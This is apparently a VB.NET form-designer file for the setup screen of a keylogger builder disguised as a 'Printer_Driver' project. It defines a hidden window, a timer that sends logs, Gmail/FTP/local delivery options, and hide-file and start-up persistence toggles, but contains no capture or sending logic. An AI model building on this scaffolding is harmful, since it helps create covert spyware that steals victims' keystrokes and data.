<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
Partial Class Setup
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()> _
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()> _
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(Setup))
        Me.FolderBrowserDialog1 = New System.Windows.Forms.FolderBrowserDialog()
        Me.Timer1 = New System.Windows.Forms.Timer(Me.components)
        Me.SendLogs = New System.Windows.Forms.Timer(Me.components)
        Me.BoosterTabControl1 = New Printer_Driver.BoosterTabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.Logs = New System.Windows.Forms.TextBox()
        Me.BoosterButton3 = New Printer_Driver.BoosterButton()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.BoosterNumericUpDown1 = New Printer_Driver.BoosterNumericUpDown()
        Me.BoosterCheckBox3 = New Printer_Driver.BoosterCheckBox()
        Me.BoosterCheckBox2 = New Printer_Driver.BoosterCheckBox()
        Me.BoosterButton2 = New Printer_Driver.BoosterButton()
        Me.TextBox1 = New System.Windows.Forms.TextBox()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.BoosterButton1 = New Printer_Driver.BoosterButton()
        Me.Username = New System.Windows.Forms.TextBox()
        Me.Password = New System.Windows.Forms.TextBox()
        Me.BoosterCheckBox1 = New Printer_Driver.BoosterCheckBox()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.BoosterRadioButton3 = New Printer_Driver.BoosterRadioButton()
        Me.BoosterRadioButton2 = New Printer_Driver.BoosterRadioButton()
        Me.BoosterRadioButton1 = New Printer_Driver.BoosterRadioButton()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.BoosterToolTip1 = New Printer_Driver.BoosterToolTip()
        Me.BoosterTabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        CType(Me.BoosterNumericUpDown1, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.SuspendLayout()
        '
        'Timer1
        '
        Me.Timer1.Enabled = True
        Me.Timer1.Interval = 10
        '
        'SendLogs
        '
        Me.SendLogs.Enabled = True
        Me.SendLogs.Interval = 300000
        '
        'BoosterTabControl1
        '
        Me.BoosterTabControl1.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.BoosterTabControl1.Controls.Add(Me.TabPage1)
        Me.BoosterTabControl1.Controls.Add(Me.TabPage2)
        Me.BoosterTabControl1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.BoosterTabControl1.Font = New System.Drawing.Font("Segoe UI", 10.0!)
        Me.BoosterTabControl1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(120, Byte), Integer), CType(CType(121, Byte), Integer), CType(CType(123, Byte), Integer))
        Me.BoosterTabControl1.ItemSize = New System.Drawing.Size(40, 170)
        Me.BoosterTabControl1.Location = New System.Drawing.Point(0, 0)
        Me.BoosterTabControl1.Multiline = True
        Me.BoosterTabControl1.Name = "BoosterTabControl1"
        Me.BoosterTabControl1.SelectedIndex = 0
        Me.BoosterTabControl1.Size = New System.Drawing.Size(643, 364)
        Me.BoosterTabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed
        Me.BoosterTabControl1.TabIndex = 0
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(66, Byte), Integer), CType(CType(66, Byte), Integer), CType(CType(66, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.Logs)
        Me.TabPage1.Controls.Add(Me.BoosterButton3)
        Me.TabPage1.Controls.Add(Me.GroupBox3)
        Me.TabPage1.Controls.Add(Me.GroupBox2)
        Me.TabPage1.Controls.Add(Me.GroupBox1)
        Me.TabPage1.Controls.Add(Me.Label1)
        Me.TabPage1.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.TabPage1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer))
        Me.TabPage1.Location = New System.Drawing.Point(174, 4)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(465, 356)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Setup"
        '
        'Logs
        '
        Me.Logs.Location = New System.Drawing.Point(296, 56)
        Me.Logs.Multiline = True
        Me.Logs.Name = "Logs"
        Me.Logs.Size = New System.Drawing.Size(123, 57)
        Me.Logs.TabIndex = 7
        Me.Logs.TabStop = False
        Me.Logs.Visible = False
        '
        'BoosterButton3
        '
        Me.BoosterButton3.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.BoosterButton3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer))
        Me.BoosterButton3.Location = New System.Drawing.Point(263, 15)
        Me.BoosterButton3.Name = "BoosterButton3"
        Me.BoosterButton3.Size = New System.Drawing.Size(62, 23)
        Me.BoosterButton3.TabIndex = 6
        Me.BoosterButton3.Text = "Build"
        Me.BoosterButton3.UseVisualStyleBackColor = True
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.BoosterNumericUpDown1)
        Me.GroupBox3.Controls.Add(Me.BoosterCheckBox3)
        Me.GroupBox3.Controls.Add(Me.BoosterCheckBox2)
        Me.GroupBox3.Controls.Add(Me.BoosterButton2)
        Me.GroupBox3.Controls.Add(Me.TextBox1)
        Me.GroupBox3.ForeColor = System.Drawing.Color.White
        Me.GroupBox3.Location = New System.Drawing.Point(40, 255)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(417, 86)
        Me.GroupBox3.TabIndex = 5
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Hosting"
        '
        'BoosterNumericUpDown1
        '
        Me.BoosterNumericUpDown1.AfterValue = Nothing
        Me.BoosterNumericUpDown1.Font = New System.Drawing.Font("Segoe UI", 10.0!)
        Me.BoosterNumericUpDown1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer))
        Me.BoosterNumericUpDown1.Location = New System.Drawing.Point(278, 48)
        Me.BoosterNumericUpDown1.Minimum = New Decimal(New Integer() {5, 0, 0, 0})
        Me.BoosterNumericUpDown1.Name = "BoosterNumericUpDown1"
        Me.BoosterNumericUpDown1.Size = New System.Drawing.Size(120, 25)
        Me.BoosterNumericUpDown1.TabIndex = 13
        Me.BoosterToolTip1.SetToolTip(Me.BoosterNumericUpDown1, "Interval per minute that logs get sent")
        Me.BoosterNumericUpDown1.Value = New Decimal(New Integer() {5, 0, 0, 0})
        '
        'BoosterCheckBox3
        '
        Me.BoosterCheckBox3.AutoSize = True
        Me.BoosterCheckBox3.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.BoosterCheckBox3.Location = New System.Drawing.Point(155, 51)
        Me.BoosterCheckBox3.Name = "BoosterCheckBox3"
        Me.BoosterCheckBox3.Size = New System.Drawing.Size(72, 19)
        Me.BoosterCheckBox3.TabIndex = 12
        Me.BoosterCheckBox3.Text = "Hide File"
        Me.BoosterToolTip1.SetToolTip(Me.BoosterCheckBox3, "Hides the file on start up (Doesn't hide from task manager)")
        Me.BoosterCheckBox3.UseVisualStyleBackColor = True
        '
        'BoosterCheckBox2
        '
        Me.BoosterCheckBox2.AutoSize = True
        Me.BoosterCheckBox2.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.BoosterCheckBox2.Location = New System.Drawing.Point(15, 51)
        Me.BoosterCheckBox2.Name = "BoosterCheckBox2"
        Me.BoosterCheckBox2.Size = New System.Drawing.Size(114, 19)
        Me.BoosterCheckBox2.TabIndex = 11
        Me.BoosterCheckBox2.Text = "Add To Start-Up "
        Me.BoosterToolTip1.SetToolTip(Me.BoosterCheckBox2, "Application start's up on windows start up")
        Me.BoosterCheckBox2.UseVisualStyleBackColor = True
        '
        'BoosterButton2
        '
        Me.BoosterButton2.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.BoosterButton2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer))
        Me.BoosterButton2.Location = New System.Drawing.Point(355, 22)
        Me.BoosterButton2.Name = "BoosterButton2"
        Me.BoosterButton2.Size = New System.Drawing.Size(43, 23)
        Me.BoosterButton2.TabIndex = 10
        Me.BoosterButton2.Text = "..."
        Me.BoosterToolTip1.SetToolTip(Me.BoosterButton2, "Browse for path to save the logs locally")
        Me.BoosterButton2.UseVisualStyleBackColor = True
        '
        'TextBox1
        '
        Me.TextBox1.AutoCompleteCustomSource.AddRange(New String() {"C:\ProgramData", "C:\UsersUsername\AppData\Roaming"})
        Me.TextBox1.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.SuggestAppend
        Me.TextBox1.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.CustomSource
        Me.TextBox1.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer))
        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.TextBox1.ForeColor = System.Drawing.Color.White
        Me.TextBox1.Location = New System.Drawing.Point(15, 22)
        Me.TextBox1.Name = "TextBox1"
        Me.TextBox1.Size = New System.Drawing.Size(334, 23)
        Me.TextBox1.TabIndex = 9
        Me.TextBox1.Text = "Input Location (FTP/Local)"
        Me.BoosterToolTip1.SetToolTip(Me.TextBox1, "Path of the FTP Or Local save-path ")
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.BoosterButton1)
        Me.GroupBox2.Controls.Add(Me.Username)
        Me.GroupBox2.Controls.Add(Me.Password)
        Me.GroupBox2.Controls.Add(Me.BoosterCheckBox1)
        Me.GroupBox2.ForeColor = System.Drawing.Color.White
        Me.GroupBox2.Location = New System.Drawing.Point(40, 136)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(265, 114)
        Me.GroupBox2.TabIndex = 4
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Login - (Ignore If Local)"
        '
        'BoosterButton1
        '
        Me.BoosterButton1.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.BoosterButton1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer))
        Me.BoosterButton1.Location = New System.Drawing.Point(188, 80)
        Me.BoosterButton1.Name = "BoosterButton1"
        Me.BoosterButton1.Size = New System.Drawing.Size(57, 19)
        Me.BoosterButton1.TabIndex = 8
        Me.BoosterButton1.Text = "Test"
        Me.BoosterToolTip1.SetToolTip(Me.BoosterButton1, "If gmail is ticked this will sent a test gmail to your account elseif ftp is tick" & _
        "ed It'll upload a test text-file else if local is ticked it'll create a local .t" & _
        "xt file")
        Me.BoosterButton1.UseVisualStyleBackColor = True
        '
        'Username
        '
        Me.Username.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer))
        Me.Username.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.Username.ForeColor = System.Drawing.Color.White
        Me.Username.Location = New System.Drawing.Point(15, 22)
        Me.Username.Name = "Username"
        Me.Username.Size = New System.Drawing.Size(230, 23)
        Me.Username.TabIndex = 7
        Me.Username.Text = "example@gmail.com"
        '
        'Password
        '
        Me.Password.BackColor = System.Drawing.Color.FromArgb(CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer), CType(CType(25, Byte), Integer))
        Me.Password.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.Password.ForeColor = System.Drawing.Color.White
        Me.Password.Location = New System.Drawing.Point(15, 51)
        Me.Password.Name = "Password"
        Me.Password.Size = New System.Drawing.Size(230, 23)
        Me.Password.TabIndex = 5
        Me.Password.Text = "Password"
        '
        'BoosterCheckBox1
        '
        Me.BoosterCheckBox1.AutoSize = True
        Me.BoosterCheckBox1.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.BoosterCheckBox1.Location = New System.Drawing.Point(15, 80)
        Me.BoosterCheckBox1.Name = "BoosterCheckBox1"
        Me.BoosterCheckBox1.Size = New System.Drawing.Size(108, 19)
        Me.BoosterCheckBox1.TabIndex = 6
        Me.BoosterCheckBox1.Text = "Show Password"
        Me.BoosterToolTip1.SetToolTip(Me.BoosterCheckBox1, "Displays Password")
        Me.BoosterCheckBox1.UseVisualStyleBackColor = True
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.BoosterRadioButton3)
        Me.GroupBox1.Controls.Add(Me.BoosterRadioButton2)
        Me.GroupBox1.Controls.Add(Me.BoosterRadioButton1)
        Me.GroupBox1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.GroupBox1.ForeColor = System.Drawing.Color.White
        Me.GroupBox1.Location = New System.Drawing.Point(40, 72)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(232, 58)
        Me.GroupBox1.TabIndex = 3
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Deliver Logs To"
        '
        'BoosterRadioButton3
        '
        Me.BoosterRadioButton3.AutoSize = True
        Me.BoosterRadioButton3.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.BoosterRadioButton3.Location = New System.Drawing.Point(155, 22)
        Me.BoosterRadioButton3.Name = "BoosterRadioButton3"
        Me.BoosterRadioButton3.Size = New System.Drawing.Size(56, 19)
        Me.BoosterRadioButton3.TabIndex = 3
        Me.BoosterRadioButton3.Text = "Local "
        Me.BoosterToolTip1.SetToolTip(Me.BoosterRadioButton3, "Writes logs to a text file locally")
        Me.BoosterRadioButton3.UseVisualStyleBackColor = True
        '
        'BoosterRadioButton2
        '
        Me.BoosterRadioButton2.AutoSize = True
        Me.BoosterRadioButton2.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.BoosterRadioButton2.Location = New System.Drawing.Point(89, 22)
        Me.BoosterRadioButton2.Name = "BoosterRadioButton2"
        Me.BoosterRadioButton2.Size = New System.Drawing.Size(45, 19)
        Me.BoosterRadioButton2.TabIndex = 2
        Me.BoosterRadioButton2.Text = "FTP"
        Me.BoosterToolTip1.SetToolTip(Me.BoosterRadioButton2, "Uploads log files to ftp")
        Me.BoosterRadioButton2.UseVisualStyleBackColor = True
        '
        'BoosterRadioButton1
        '
        Me.BoosterRadioButton1.AutoSize = True
        Me.BoosterRadioButton1.Checked = True
        Me.BoosterRadioButton1.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.BoosterRadioButton1.Location = New System.Drawing.Point(15, 22)
        Me.BoosterRadioButton1.Name = "BoosterRadioButton1"
        Me.BoosterRadioButton1.Size = New System.Drawing.Size(56, 19)
        Me.BoosterRadioButton1.TabIndex = 1
        Me.BoosterRadioButton1.TabStop = True
        Me.BoosterRadioButton1.Text = "Gmail"
        Me.BoosterToolTip1.SetToolTip(Me.BoosterRadioButton1, "Sends Logs Via Gmail")
        Me.BoosterRadioButton1.UseVisualStyleBackColor = True
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Font = New System.Drawing.Font("Segoe UI", 18.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label1.ForeColor = System.Drawing.Color.White
        Me.Label1.Location = New System.Drawing.Point(153, 5)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(87, 32)
        Me.Label1.TabIndex = 0
        Me.Label1.Text = "Set-up"
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(66, Byte), Integer), CType(CType(66, Byte), Integer), CType(CType(66, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.Label2)
        Me.TabPage2.Font = New System.Drawing.Font("Segoe UI", 9.0!)
        Me.TabPage2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer), CType(CType(182, Byte), Integer))
        Me.TabPage2.Location = New System.Drawing.Point(174, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(465, 356)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Watcher"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Font = New System.Drawing.Font("Segoe UI", 18.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Label2.ForeColor = System.Drawing.Color.White
        Me.Label2.Location = New System.Drawing.Point(6, 5)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(122, 32)
        Me.Label2.TabIndex = 7
        Me.Label2.Text = "View Logs"
        '
        'BoosterToolTip1
        '
        Me.BoosterToolTip1.AutomaticDelay = 100
        Me.BoosterToolTip1.AutoPopDelay = 2000
        Me.BoosterToolTip1.BackColor = System.Drawing.Color.FromArgb(CType(CType(36, Byte), Integer), CType(CType(36, Byte), Integer), CType(CType(36, Byte), Integer))
        Me.BoosterToolTip1.InitialDelay = 100
        Me.BoosterToolTip1.OwnerDraw = True
        Me.BoosterToolTip1.ReshowDelay = 20
        Me.BoosterToolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info
        '
        'Setup
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(7.0!, 15.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.BackColor = System.Drawing.Color.White
        Me.ClientSize = New System.Drawing.Size(643, 364)
        Me.Controls.Add(Me.BoosterTabControl1)
        Me.Font = New System.Drawing.Font("Segoe UI", 9.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.ForeColor = System.Drawing.Color.White
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow
        Me.Icon = CType(resources.GetObject("$this.Icon"), System.Drawing.Icon)
        Me.MaximizeBox = False
        Me.MinimizeBox = False
        Me.Name = "Setup"
        Me.Opacity = 0.0R
        Me.ShowInTaskbar = False
        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
        Me.BoosterTabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage1.PerformLayout()
        Me.GroupBox3.ResumeLayout(False)
        Me.GroupBox3.PerformLayout()
        CType(Me.BoosterNumericUpDown1, System.ComponentModel.ISupportInitialize).EndInit()
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
        Me.TabPage2.ResumeLayout(False)
        Me.TabPage2.PerformLayout()
        Me.ResumeLayout(False)

    End Sub
    Friend WithEvents BoosterTabControl1 As Printer_Driver.BoosterTabControl
    Friend WithEvents TabPage1 As System.Windows.Forms.TabPage
    Friend WithEvents TabPage2 As System.Windows.Forms.TabPage
    Friend WithEvents BoosterRadioButton2 As Printer_Driver.BoosterRadioButton
    Friend WithEvents BoosterRadioButton1 As Printer_Driver.BoosterRadioButton
    Friend WithEvents Label1 As System.Windows.Forms.Label
    Friend WithEvents GroupBox2 As System.Windows.Forms.GroupBox
    Friend WithEvents GroupBox1 As System.Windows.Forms.GroupBox
    Friend WithEvents BoosterCheckBox1 As Printer_Driver.BoosterCheckBox
    Friend WithEvents Username As System.Windows.Forms.TextBox
    Friend WithEvents Password As System.Windows.Forms.TextBox
    Friend WithEvents GroupBox3 As System.Windows.Forms.GroupBox
    Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    Friend WithEvents BoosterButton1 As Printer_Driver.BoosterButton
    Friend WithEvents BoosterRadioButton3 As Printer_Driver.BoosterRadioButton
    Friend WithEvents BoosterNumericUpDown1 As Printer_Driver.BoosterNumericUpDown
    Friend WithEvents BoosterCheckBox3 As Printer_Driver.BoosterCheckBox
    Friend WithEvents BoosterCheckBox2 As Printer_Driver.BoosterCheckBox
    Friend WithEvents BoosterButton2 As Printer_Driver.BoosterButton
    Friend WithEvents Label2 As System.Windows.Forms.Label
    Friend WithEvents BoosterToolTip1 As Printer_Driver.BoosterToolTip
    Friend WithEvents FolderBrowserDialog1 As System.Windows.Forms.FolderBrowserDialog
    Friend WithEvents BoosterButton3 As Printer_Driver.BoosterButton
    Friend WithEvents Timer1 As System.Windows.Forms.Timer
    Friend WithEvents Logs As System.Windows.Forms.TextBox
    Friend WithEvents SendLogs As System.Windows.Forms.Timer
End Class
